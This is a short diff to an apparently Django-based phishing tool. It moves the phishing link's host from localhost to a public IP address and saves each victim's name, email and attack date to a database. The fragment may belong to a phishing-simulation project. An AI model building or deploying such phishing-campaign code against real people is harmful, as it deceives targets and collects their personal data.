@@ -162,7 +162,7 @@ def phish_view(request):#logic for quick phishing attack
     #attack_email(victim_email,victim_name,random_id)#phishing email
 
     today = datetime.datetime.now().date()#obvious
-    phish_url='http://127.0.0.1:8000/gophish/hooked/'+mychars+'/'#url to be inside the email
+    phish_url='http://139.162.178.79:8000/gophish/hooked/'+mychars+'/'#url to be inside the email
     victim=victims(fullname=victim_name,useremail=victim_email,date_of_attack=str(today),url=phish_url,auto_id=mychars)#record victim details in db
     victim.save()#save victim in db
 
